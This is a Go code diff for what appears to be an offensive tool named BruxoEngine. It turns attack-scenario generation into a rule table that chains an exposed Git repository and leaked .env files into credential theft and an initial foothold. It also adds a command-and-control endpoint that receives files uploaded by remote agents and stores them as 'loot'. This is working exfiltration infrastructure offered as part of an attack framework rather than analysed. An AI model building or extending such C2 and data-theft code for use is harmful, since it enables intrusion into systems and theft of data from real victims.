@@ -14,6 +14,7 @@ import (
 	"net/url"
 	"os"
 	"os/signal"
+	"path/filepath"
 	"regexp"
 	"sort"
 	"strconv"
@@ -97,6 +98,26 @@ type AttackScenario struct {
 	Steps              []string `json:"Steps"`
 	EstimatedTime      string   `json:"EstimatedTime"`
 	SuccessProbability string   `json:"SuccessProbability"`
+}
+
+type AttackRule struct {
+	Name              string
+	Conditions        []string // List of vulnerability names that must be present
+	ResultingScenario AttackScenario
+}
+
+var attackRules = []AttackRule{
+	{
+		Name:       "Exposed Credentials Path",
+		Conditions: []string{"Exposed Git Repository", "Sensitive File Exposed"},
+		ResultingScenario: AttackScenario{
+			Objective:          "Compromise Server via Exposed Credentials",
+			Steps:              []string{"Find Exposed Git Repository", "Extract Sensitive Files (e.g., .env)", "Use Credentials to Access Services", "Achieve Initial Foothold"},
+			EstimatedTime:      "1-2 hours",
+			SuccessProbability: "90%",
+		},
+	},
+	// Futuras regras podem ser adicionadas aqui
 }
 
 type Agent struct {
@@ -824,27 +845,28 @@ func (b *BruxoEngine) collectEvidence(body []byte, sourceURL string) []Evidence 
 }
 
 func (b *BruxoEngine) generateAttackScenarios() {
-	// Exemplo de lógica para gerar um cenário de ataque
-	var hasExposedGit, hasSensitiveFile bool
+	// 1. Criar um set com todas as vulnerabilidades encontradas para busca rápida
+	foundVulns := make(map[string]bool)
 	for _, result := range b.results {
 		for _, vuln := range result.Vulnerabilities {
-			if vuln.Name == "Exposed Git Repository" {
-				hasExposedGit = true
-			}
-			if vuln.Name == "Sensitive File Exposed" {
-				hasSensitiveFile = true
-			}
+			foundVulns[vuln.Name] = true
 		}
 	}
 
-	if hasExposedGit && hasSensitiveFile {
-		scenario := AttackScenario{
-			Objective:          "Compromise Server via Exposed Credentials",
-			Steps:              []string{"Find Exposed Git Repository", "Extract Sensitive Files (e.g., .env)", "Use Credentials to Access Services", "Achieve Initial Foothold"},
-			EstimatedTime:      "1-2 hours",
-			SuccessProbability: "90%",
+	// 2. Iterar sobre as regras e verificar se as condições são atendidas
+	for _, rule := range attackRules {
+		conditionsMet := true
+		for _, condition := range rule.Conditions {
+			if !foundVulns[condition] {
+				conditionsMet = false
+				break
+			}
 		}
-		b.attackScenarios = append(b.attackScenarios, scenario)
+
+		if conditionsMet {
+			b.attackScenarios = append(b.attackScenarios, rule.ResultingScenario)
+			b.logger.Info("Generated attack scenario: %s", rule.Name)
+		}
 	}
 }
 
@@ -1101,6 +1123,7 @@ func (b *BruxoEngine) startC2Server() {
 	http.HandleFunc("/api/agents", b.handleGetAgents)
 	http.HandleFunc("/api/agents/", b.handlePostTask)
 	http.HandleFunc("/api/tasks/", b.handleGetTaskResult)
+	http.HandleFunc("/c2/upload/", b.handleC2Upload)
 
 	if err := http.ListenAndServe(":8080", nil); err != nil {
 		b.logger.Error("C2 server failed: %v", err)
@@ -1274,6 +1297,46 @@ func (b *BruxoEngine) handlePostTask(w http.ResponseWriter, r *http.Request) {
 		b.logger.Error("Task queue for agent %s is full", agentID)
 		http.Error(w, "Task queue is full", http.StatusServiceUnavailable)
 	}
+}
+
+func (b *BruxoEngine) handleC2Upload(w http.ResponseWriter, r *http.Request) {
+	if r.Method != http.MethodPost {
+		http.Error(w, "Invalid request method", http.StatusMethodNotAllowed)
+		return
+	}
+
+	parts := strings.Split(r.URL.Path, "/")
+	if len(parts) < 4 {
+		http.Error(w, "Invalid URL path", http.StatusBadRequest)
+		return
+	}
+	agentID := parts[2]
+	fileName := r.URL.Query().Get("file")
+	if fileName == "" {
+		fileName = fmt.Sprintf("upload_%d", time.Now().UnixNano())
+	}
+
+	lootDir := filepath.Join("c2_loot", agentID)
+	if err := os.MkdirAll(lootDir, 0755); err != nil {
+		http.Error(w, "Could not create loot directory", http.StatusInternalServerError)
+		return
+	}
+
+	filePath := filepath.Join(lootDir, filepath.Base(fileName))
+
+	fileData, err := io.ReadAll(r.Body)
+	if err != nil {
+		http.Error(w, "Could not read request body", http.StatusInternalServerError)
+		return
+	}
+
+	if err := os.WriteFile(filePath, fileData, 0644); err != nil {
+		http.Error(w, "Could not write file", http.StatusInternalServerError)
+		return
+	}
+
+	b.logger.Info("File '%s' received from agent %s and saved to %s", fileName, agentID, filePath)
+	w.WriteHeader(http.StatusOK)
 }
 
 func (b *BruxoEngine) handleGetTaskResult(w http.ResponseWriter, r *http.Request) {
